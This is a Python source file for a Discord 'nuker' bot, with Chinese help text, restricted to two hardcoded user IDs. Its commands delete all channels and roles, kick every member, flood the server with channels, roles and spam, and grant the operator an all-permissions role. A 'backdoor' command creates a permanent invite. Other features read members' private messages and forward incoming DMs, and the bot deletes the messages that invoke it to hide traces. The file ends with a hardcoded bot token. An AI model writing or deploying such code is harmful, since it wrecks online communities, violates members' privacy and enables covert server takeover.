import discord
from discord.ext import commands
import random
import datetime
import asyncio
import string
from flask import Flask
from threading import Thread
import os
import json
import io
import ctypes.util
from discord import opus
import ctypes.util
from discord import opus

def load_opus_lib():
    if opus.is_loaded():
        return True
    lib = ctypes.util.find_library('opus')
    if lib:
        try:
            opus.load_opus(lib)
            print(f"✅ 系統自動尋找成功: {lib}")
            return True
        except:
            pass
    paths = [
        'libopus.so.0',
        'libopus.so',
        '/usr/lib/x86_64-linux-gnu/libopus.so.0',
        '/usr/lib/x86_64-linux-gnu/libopus.so',
        '/usr/local/lib/libopus.so',
        '/usr/lib/libopus.so.0'
    ]
    for path in paths:
        try:
            opus.load_opus(path)
            print(f"✅ 手動路徑載入成功: {path}")
            return True
        except Exception:
            continue
    print("❌ 所有 Opus 載入路徑均失敗")
    return False

load_opus_lib()
app = Flask('')
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

ALLOWED_IDS = [1008278721007992863, 1355108796388872292]
VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))

async def is_me(ctx):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await ctx.message.delete()
        except:
            pass
        return True
    return False

@app.route('/')
def home():
    return f"Traveler System [{VERSION_ID}] is Online."

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

@bot.event
async def on_ready():
    print(f'系統連線成功 | 實例 ID: {VERSION_ID} | 帳號: {bot.user}')

@bot.command(name="help")
async def help_msg(ctx):
    if not await is_me(ctx): return
    
    embed = discord.Embed(
        title="🧳 旅行者系統 - 指令完整手冊", 
        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
        color=0x2b2d31
    )
    
    embed.add_field(
        name="🛡️ 基礎管理", 
        value=(
            "`!tm @成員 [分]` - 禁言成員\n"
            "`!kick_everyone` - 踢出伺服器全員\n"
            "`!bye` - 機器人退出伺服器\n"
            "`!set_server [名]` - 修改伺服器名稱\n"
            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
            "`!clean_keyword [詞] [數]` - 刪除特定關鍵字\n"
            "`!del_msg [數]` - 批次清理訊息\n"
            "`!disrole @成員` - 剝奪對方身分\n"
            "`!add_role @成員 @組` - 給予身分組\n"
            "`!remove_role @成員 @組` - 移除身分組\n"
            "`!backdoor` - 獲取永久邀請連結\n"
            "`!move_all [頻道ID]` - 強制全體移動語音\n"
        ), 
        inline=False
    )
    
    embed.add_field(
        name="🔥 破壞", 
        value=(
            "`!del_ch` - 刪除所有頻道\n"
            "`!del_role` - 刪除所有身分組\n"
            "`!100ch` - 建立 100 個頻道\n"
            "`!100rl` - 建立 100 個身分組\n"
            "`!spam [次] [文]` - 洗頻攻擊\n"
        ), 
        inline=False
    )
    
    embed.add_field(
        name="🛠️ 進階工具", 
        value=(
            "`!eval [code]` - 執行動態 Python 腳本\n"
            "`!snapshot` - 導出伺服器完整結構 JSON\n"
            "`!op_me` - 獲取最高權限\n"
            "`!reset` - 強制重啟系統實例\n"
        ), 
        inline=False
    )

    embed.add_field(
        name="🎮 有趣系統", 
        value=(
            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
            "`!dm @成員 [文]` - 以機器人名義私訊\n"
        ), 
        inline=False
    )
    
    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
    await ctx.send(embed=embed)

@bot.command(name="dm")
async def dm(ctx, member: discord.Member, *, text: str):
    if not await is_me(ctx): return
    try: await member.send(text)
    except: pass

@bot.command(name="del_ch")
async def nuke_channels(ctx):
    if not await is_me(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    await ctx.guild.create_text_channel("general")

@bot.command(name="kick_everyone")
async def kick_everyone(ctx):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member != ctx.guild.owner:
            try: await member.kick()
            except: pass

@bot.command(name="del_role")
async def clear_roles(ctx):
    if not await is_me(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

@bot.command(name="set_server")
async def set_server(ctx, *, name: str):
    if not await is_me(ctx): return
    try: await ctx.guild.edit(name=name)
    except: pass

@bot.command(name="bye")
async def leave_server(ctx):
    if not await is_me(ctx): return
    await ctx.guild.leave()

@bot.command(name="del_msg")
async def purge_chat(ctx, amount: int = 10):
    if not await is_me(ctx): return
    try: await ctx.channel.purge(limit=amount)
    except: pass

@bot.command(name="spam")
async def spam(ctx, count: int, *, text: str):
    if not await is_me(ctx): return
    for i in range(min(count, 100)):
        try:
            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
            await ctx.send(f"{text} | {suffix}")
            await asyncio.sleep(0.8)
        except: break

@bot.command(name="100rl")
async def role_hell(ctx):
    if not await is_me(ctx): return
    for i in range(100):
        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        try: await ctx.guild.create_role(name=f"{i}", color=color)
        except: break

@bot.command(name="100ch")
async def flood(ctx, name="ch-----test"):
    if not await is_me(ctx): return
    for i in range(100):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break

@bot.command(name="op_me")
async def op_me(ctx):
    if not await is_me(ctx): return
    guild = ctx.guild
    try:
        new_role = await guild.create_role(
            name="OP", 
            permissions=discord.Permissions.all(), 
            color=discord.Color.from_str("#2b2d31")
        )
        await ctx.author.add_roles(new_role)
        await new_role.edit(position=guild.me.top_role.position - 1)
    except: pass

@bot.command(name="tm")
async def tm(ctx, member: discord.Member = None, minutes: int = 10):
    if not await is_me(ctx): return
    if member is None: return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason="呼吸")
    except: pass

@bot.command(name="backdoor")
async def backdoor(ctx):
    if not await is_me(ctx): return
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.author.send(f"永久入口: {inv.url}")
    except: pass

@bot.command(name="move_all")
async def move_all(ctx, channel: discord.VoiceChannel):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try: await member.move_to(channel)
            except: pass

@bot.command(name="disrole")
async def isolate(ctx, member: discord.Member):
    if not await is_me(ctx): return
    try: await member.edit(roles=[])
    except: pass

@bot.command(name="server_gate")
async def server_gate(ctx, status: str):
    if not await is_me(ctx): return
    can_send = True if status == "unlock" else False
    for channel in ctx.guild.text_channels:
        try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
        except: pass

@bot.command(name="add_role")
async def add_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.add_roles(role)
    except: pass

@bot.command(name="remove_role")
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.remove_roles(role)
    except: pass

@bot.command(name="get_dm")
async def get_dm(ctx, member: discord.Member, limit: int = 10):
    if not await is_me(ctx): return
    try:
        dm_channel = member.dm_channel or await member.create_dm()
        history = []
        async for msg in dm_channel.history(limit=limit):
            who = "機器人" if msg.author == bot.user else "成員"
            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
        result = "\n".join(reversed(history)) or "無私訊紀錄"
        await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
    except: pass

@bot.command(name="snapshot")
async def snapshot(ctx):
    if ctx.author.id not in ALLOWED_IDS: return
    await ctx.author.send("🚀 正在生成伺服器備份...")
    guild = ctx.guild
    roles = []
    for r in sorted(guild.roles, key=lambda x: x.position):
        if not r.managed and r.name != "@everyone":
            roles.append({
                "name": r.name,
                "color": r.color.value,
                "perms": r.permissions.value
            })
    data = {
        "server": guild.name,
        "roles": roles,
        "categories": []
    }
    for cat in guild.categories:
        cat_info = {"name": cat.name, "overwrites": [], "channels": []}
        for target, ov in cat.overwrites.items():
            cat_info["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
        for ch in cat.channels:
            ch_data = {"name": ch.name, "type": str(ch.type), "overwrites": []}
            for target, ov in ch.overwrites.items():
                ch_data["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
            if isinstance(ch, discord.TextChannel):
                msgs = []
                try:
                    async for m in ch.history(limit=10, oldest_first=True):
                        msgs.append(m.content)
                except: pass
                ch_data["history"] = msgs
            cat_info["channels"].append(ch_data)
        data["categories"].append(cat_info)
    json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
    await ctx.author.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
    
@bot.command(name="eval")
async def eval_code(ctx, *, code: str = None):
    if ctx.author.id not in ALLOWED_IDS: return
    if ctx.message.attachments:
        file_data = await ctx.message.attachments[0].read()
        data = json.loads(file_data.decode('utf-8'))
        await ctx.author.send(f"🏗️ 開始還原伺服器：{data['server']}")
        created_roles = []
        for r_data in data.get('roles', []):
            role = discord.utils.get(ctx.guild.roles, name=r_data['name'])
            if not role:
                try:
                    role = await ctx.guild.create_role(
                        name=r_data['name'],
                        color=discord.Color(r_data['color']),
                        permissions=discord.Permissions(r_data['perms'])
                    )
                except: continue
            created_roles.append(role)
        try:
            payload = {role: i + 1 for i, role in enumerate(created_roles)}
            await ctx.guild.edit_role_positions(payload)
        except Exception as e:
            await ctx.author.send(f"⚠️ 順序調整受限，請確保機器人身分組在最頂端後手動調整或再試一次: {e}")
        role_map = {r.name: r for r in ctx.guild.roles}
        for cat_data in data['categories']:
            cat_ov = {}
            for o in cat_data.get('overwrites', []):
                target = role_map.get(o['target'])
                if target: cat_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
            new_cat = await ctx.guild.create_category(cat_data['name'], overwrites=cat_ov)
            for ch_data in cat_data['channels']:
                ch_ov = {}
                for o in ch_data.get('overwrites', []):
                    target = role_map.get(o['target'])
                    if target: ch_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
                if ch_data['type'] == 'text':
                    new_ch = await new_cat.create_text_channel(ch_data['name'], overwrites=ch_ov)
                    for content in ch_data.get('history', []):
                        if content:
                            await new_ch.send(content)
                            await asyncio.sleep(0.5)
                elif ch_data['type'] == 'voice':
                    await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
        return await ctx.author.send("✅ 還原完成!")
        
@bot.command(name="reset")
async def reboot(ctx):
    if not await is_me(ctx): return
    os._exit(0)

@bot.command(name="join_vc")
async def join(ctx):
    if not await is_me(ctx): return 
    if ctx.author.voice and ctx.author.voice.channel:
        voice_channel = ctx.author.voice.channel
        try:
            print(f"正在嘗試連線至: {voice_channel.name}")
            if ctx.voice_client:
                await ctx.voice_client.move_to(voice_channel)
            else:
                await voice_channel.connect()
            print("連線成功")
        except Exception as e:
            await ctx.author.send(f"❌ 無法加入語音: `{e}`")
            print(f"語音連線失敗: {e}")
    else:
        await ctx.author.send("⚠️ 你必須先進入一個語音頻道！")
        
@bot.command(name="leave_vc")
async def dc(ctx):
    if not await is_me(ctx): return
    try: await ctx.message.delete()
    except: pass

    if ctx.voice_client:
        try: await ctx.voice_client.disconnect()
        except: pass
            
@bot.event
async def on_message(message):
    if message.author == bot.user: return
    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("!"):
        owner = await bot.fetch_user(ALLOWED_IDS[0])
        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
    await bot.process_commands(message)

if __name__ == "__main__":
    keep_alive()

bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
